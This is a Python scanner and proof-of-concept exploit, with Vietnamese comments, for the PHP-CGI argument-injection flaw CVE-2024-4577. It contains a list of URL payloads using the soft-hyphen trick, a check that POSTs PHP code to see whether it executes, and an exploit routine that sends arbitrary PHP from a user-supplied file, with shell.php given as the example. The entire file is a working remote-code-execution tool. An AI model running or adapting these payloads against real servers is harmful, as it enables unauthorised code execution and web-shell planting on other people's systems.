import argparse
import requests
from colorama import init, Fore, Style

init(autoreset=True)

# Danh sách các payload khác nhau
payloads = [
    "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    "/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    "/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    "/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
]

def get_payload(target_url, urlpatch):
    """Lấy payload dựa trên lựa chọn urlpatch"""
    if urlpatch is not None and 1 <= urlpatch <= len(payloads) - 1:
        payload = payloads[urlpatch]
    else:
        payload = payloads[0]
    return f"{target_url}/{payload.lstrip('/')}"

def scan_for_vulnerability(target_url, urlpatch):
    """Đang quét lỗ hổng chèn đối số CGI PHP RCE CVE-2024-4577"""
    try:
        url = get_payload(target_url, urlpatch)
        print(f"{Fore.LIGHTBLUE_EX}[INFO] Đang sử dụng payload: {url}{Style.RESET_ALL}")

        # Gửi tải trọng yêu cầu POST để phát hiện lỗ hổng
        response = requests.post(url, data="echo 'Test'; die;", timeout=10)  # Điều chỉnh thời gian chờ khi cần thiết
        
        if 'Test' in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False

def exploit(target_url, payload_file, urlpatch):
    """Exploiting CVE-2024-4577 """
    try:
        url = get_payload(target_url, urlpatch)
        print(f"{Fore.LIGHTBLUE_EX}[INFO] Đang sử dụng payload: {url}{Style.RESET_ALL}")
        
        with open(payload_file, 'r') as file:
            php_payload = file.read()
        
        # Gửi yêu cầu POST với mã PHP được cung cấp
        response = requests.post(url, data=php_payload, timeout=10)# Điều chỉnh thời gian chờ khi cần thiết 
        
        if response.status_code == 200:
            print(f'{Fore.GREEN}[+] Khai thác thành công!')
        else:
            print(f'{Fore.RED}[!] Khai thác có thể đã thất bại.')
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def scan_all_payloads(target_url):
    """Quét tất cả các payload và đưa ra kết quả"""
    results = []
    for i in range(1, len(payloads)):
        result = scan_for_vulnerability(target_url, i)
        results.append((i, result))
    return results

if __name__ == "__main__":
    banner = f"""{Fore.LIGHTCYAN_EX}                                                   
,------. ,--.  ,--.,------.   ,-----.,--.   ,--.,------.        ,---.   ,--.  ,---.   ,---.         ,---.,-----.,-----.,-----. ,------.  ,-----.,------. 
|  .--. '|  '--'  ||  .--. ' '  .--./ \  `.'  / |  .---',-----.'.-.  \ /    \'.-.  \ /    |,-----. /    ||  .--''--,  /'--,  / |  .--. ''  .--./|  .---' 
|  '--' ||  .--.  ||  '--' | |  |      \     /  |  `--, '-----' .-' .'|  ()  |.-' .'/  '  |'-----'/  '  |'--. `\ .'  /  .'  /  |  '--'.'|  |    |  `--,  
|  | --' |  |  |  ||  | --'  '  '--'\   \   /   |  `---.       /   '-. \    //   '-.'--|  |       '--|  |.--'  //   /  /   /   |  |\  \ '  '--'\|  `---. 
`--'     `--'  `--'`--'       `-----'    `-'    `------'       '-----'  `--' '-----'   `--'          `--'`----' `--'   `--'    `--' '--' `-----'`------'  
        Author: Demongod | CVE-2024-4577 | PoC and Scanner |                      
    {Style.RESET_ALL}"""
    parser = argparse.ArgumentParser(description="RCE: Trình quét và khai thác đối số PHP CGI",
                                     epilog=f"{Fore.LIGHTCYAN_EX}Example: python3 CVE-2024-4577.py -t http://example.com -e -p shell.php --urlpatch 2{Style.RESET_ALL}")
    print(banner)
    parser.add_argument('-t', '--target', dest='target', help='URL mục tiêu hoặc tên miền (e.g., http://example.com)', required=True)
    parser.add_argument('-s', '--scan', action='store_true', help='Chỉ quét lỗ hổng')
    parser.add_argument('-e', '--exploit', action='store_true', help='Khai thác lỗ hổng sau khi quét')
    parser.add_argument('-p', '--payload', dest='payload_file', help='Tệp tải trọng PHP để thực thi (e.g., shell.php)')
    parser.add_argument('-c', '--urlpatch', type=int, choices=range(1, len(payloads)), help='Chọn URL payload (1-4)')
    parser.add_argument('-cA', '--scan-all', action='store_true', help='Quét tất cả các payload cùng một lúc')

    args = parser.parse_args()

    if not any([args.target]):
        parser.error('Vui lòng cung cấp URL mục tiêu (--target) hoặc một URL để tìm nạp phiên bản PHP (--url)')

    if args.target:
        args.target = args.target.rstrip('/')
    
    if args.scan and args.target:
        if args.scan_all:
            results = scan_all_payloads(args.target)
            for i, result in results:
                status = f"{Fore.LIGHTGREEN_EX}[+] dễ bị tấn công CVE-2024-4577" if result else f"{Fore.LIGHTYELLOW_EX}[-] không dễ bị tấn công CVE-2024-4577"
                print(f"{Fore.LIGHTCYAN_EX}[INFO] Payload {i}: {status}{Style.RESET_ALL}")
        else:
            if scan_for_vulnerability(args.target, args.urlpatch):
                print(f"{Fore.LIGHTGREEN_EX}[+] Target {args.target} dễ bị tấn công bởi CVE-2024-4577{Style.RESET_ALL}\n")
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[-] Target {args.target} không dễ bị tấn công bởi CVE-2024-4577{Style.RESET_ALL}\n")
    
    if args.exploit and args.payload_file and args.target:
        exploit(args.target, args.payload_file, args.urlpatch)
    elif args.exploit:
        print(f"{Fore.RED}[-] Vui lòng cung cấp tải trọng PHP để thực thi bằng tùy chọn --payload")
